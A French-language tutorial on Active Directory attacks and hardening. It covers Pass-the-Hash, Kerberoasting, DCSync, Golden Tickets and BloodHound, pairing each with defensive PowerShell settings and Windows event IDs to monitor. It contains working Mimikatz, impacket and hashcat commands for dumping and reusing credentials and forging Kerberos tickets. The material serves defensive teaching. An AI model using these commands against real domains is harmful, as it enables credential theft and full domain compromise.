# Active Directory : attaques et défense

Active Directory (AD) est le système d'authentification central de **90% des entreprises Fortune 500**. C'est aussi la cible principale des attaquants lors d'intrusions. Comprendre les attaques AD est essentiel pour défendre votre infrastructure Windows.

## Qu'est-ce qu'Active Directory ?

Active Directory est le service d'annuaire de Microsoft qui gère :
- **L'authentification** : qui peut se connecter
- **L'autorisation** : ce que chaque utilisateur peut faire
- **Les politiques** : configuration des postes (GPO)
- **Les ressources** : partages réseau, imprimantes, applications

```
Domaine : entreprise.local
         │
    [Domain Controller]
         │
    ┌────┴────┐
    │         │
[Users]   [Computers]
    │         │
Jean      PC-Jean
Marie     PC-Marie
Admin     Serveur-01
```

### Composants clés

| Composant | Rôle |
|-----------|------|
| Domain Controller (DC) | Serveur central AD |
| LDAP | Protocole d'accès à l'annuaire |
| Kerberos | Protocole d'authentification |
| NTLM | Protocole d'authentification legacy |
| GPO | Group Policy Objects - politiques de configuration |
| OU | Organizational Units - conteneurs d'organisation |

## Les attaques Active Directory courantes

### 1. Pass-the-Hash (PtH)

Windows stocke les hashes NTLM des mots de passe en mémoire. Un attaquant peut utiliser ce hash directement sans connaître le mot de passe en clair.

```bash
# Extraction des hashes avec Mimikatz (sur système compromis)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# Résultat :
# Username : Administrateur
# NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0  ← Hash utilisable !

# Pass-the-Hash avec impacket
python3 psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
  Administrateur@192.168.1.10
# Connexion réussie sans connaître le mot de passe !
```

**Défense :**
```powershell
# Activer la protection LSA (empêche l'extraction des hashes)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
  -Name "RunAsPPL" -Value 1

# Windows Credential Guard (Windows 10/11 Enterprise)
# Isole les credentials dans une VM sécurisée

# Désactiver NTLM, forcer Kerberos
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
  -Name "LmCompatibilityLevel" -Value 5
```

### 2. Kerberoasting

Kerberos permet de demander des tickets de service pour n'importe quel compte. Les tickets sont chiffrés avec le hash du compte de service — crackable hors ligne.

```bash
# Identifier les comptes avec SPN (cibles Kerberoasting)
# Depuis une machine du domaine
setspn -Q */* | grep -v "CN=krbtgt"

# Impacket - Récupérer les tickets kerberos
python3 GetUserSPNs.py entreprise.local/user:password -dc-ip 192.168.1.1 -request

# Résultat : hash Kerberos 5 crackable avec hashcat
hashcat -m 13100 hashes.txt wordlist.txt --rules rockyou-30000.rule
```

**Défense :**
```powershell
# Utiliser des mots de passe longs pour les comptes de service (30+ chars)
# Ou utiliser des gMSA (Group Managed Service Accounts)
New-ADServiceAccount -Name "MonService" -DNSHostName "serveur.entreprise.local" `
  -PrincipalsAllowedToRetrieveManagedPassword "Serveurs_Autorisés"

# Auditer les SPN existants
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### 3. DCSync

Permet à un attaquant avec les bons droits de simuler un Domain Controller et de demander la réplication de tous les hashes de mots de passe.

```bash
# DCSync avec Mimikatz (nécessite droits Replication)
mimikatz # lsadump::dcsync /domain:entreprise.local /user:krbtgt
# Récupère le hash NTLM du compte krbtgt → permet de créer des Golden Tickets

# Avec impacket
python3 secretsdump.py entreprise.local/AdminDA:password@192.168.1.1
# Dump de tous les hashes du domaine !
```

**Défense :**
```powershell
# Auditer qui a les droits DCSync
# Ces droits ne devraient appartenir qu'aux DCs !
Get-ADObject -Filter * -Properties nTSecurityDescriptor | ...

# Surveiller l'event ID 4662 dans les logs Windows
# (Accès à un objet AD avec droit Replication)
```

### 4. Pass-the-Ticket / Golden Ticket

```bash
# Golden Ticket : créer un ticket Kerberos forgé valable 10 ans
# Nécessite le hash du compte krbtgt (obtenu via DCSync)

mimikatz # kerberos::golden /domain:entreprise.local \
  /sid:S-1-5-21-xxxxx \
  /krbtgt:HASH_KRBTGT \
  /user:Administrateur \
  /ticket:golden.kirbi

# Utiliser le golden ticket
mimikatz # kerberos::ptt golden.kirbi
# Accès à toutes les ressources du domaine !
```

**Défense :**
```powershell
# Réinitialiser le mot de passe krbtgt DEUX FOIS (intervalle 10h)
# après toute compromission suspectée
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (Read-Host -AsSecureString)

# Activer Protected Users Security Group pour les comptes sensibles
Add-ADGroupMember -Identity "Protected Users" -Members "Administrateur"
```

## BloodHound : cartographier les chemins d'attaque

BloodHound est l'outil de référence pour visualiser les chemins d'attaque dans AD.

```bash
# Collecte des données avec SharpHound
.\SharpHound.exe -c All

# Ou avec impacket (sans agent sur le domaine)
python3 bloodhound-python -u user -p password \
  -d entreprise.local -dc dc01.entreprise.local -c All

# Lancer BloodHound
neo4j start
bloodhound

# Requêtes utiles dans BloodHound
"Find all Domain Admins"
"Shortest Paths to Domain Admins"
"Find Principals with DCSync Rights"
"Users with most Local Admin Rights"
```

## Durcissement Active Directory

```powershell
# 1. Tier Model - Séparer les niveaux d'administration
# Tier 0 : Domain Admins (seulement sur DCs)
# Tier 1 : Admins serveurs (seulement sur serveurs)
# Tier 2 : Admins postes (seulement sur postes)
# Interdire la connexion Tier 0 sur Tier 1/2 !

# 2. LAPS - Mot de passe admin local unique par machine
Install-Module LAPS
# Chaque PC a un mot de passe administrateur local unique
# Stocké dans AD, accessible seulement par les admins autorisés

# 3. Privileged Access Workstations (PAW)
# Postes dédiés uniquement à l'administration
# Pas d'accès internet, pas d'email, pas de navigation web

# 4. Audit des groupes privilégiés
Get-ADGroupMember -Identity "Domain Admins"
Get-ADGroupMember -Identity "Enterprise Admins"
# Ces groupes doivent être aussi vides que possible !

# 5. Activer l'audit avancé
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
```

## Events Windows à surveiller

| Event ID | Signification |
|----------|---------------|
| 4624 | Connexion réussie |
| 4625 | Échec de connexion |
| 4648 | Connexion avec credentials explicites |
| 4662 | Accès à un objet AD (DCSync !) |
| 4720 | Création d'un compte utilisateur |
| 4728 | Ajout à un groupe privilégié |
| 7045 | Installation d'un nouveau service |

## Conclusion

Active Directory est à la fois le point d'entrée le plus attaqué et le plus critique des environnements Windows. Une compromission du DC signifie une compromission totale du domaine. Les clés de la défense : **moindre privilège, surveillance des groupes privilégiés, journalisation exhaustive** et réponse rapide aux incidents.

---
*Article suivant : [Sécurité mobile : Android et iOS](../articles/securite-mobile)*
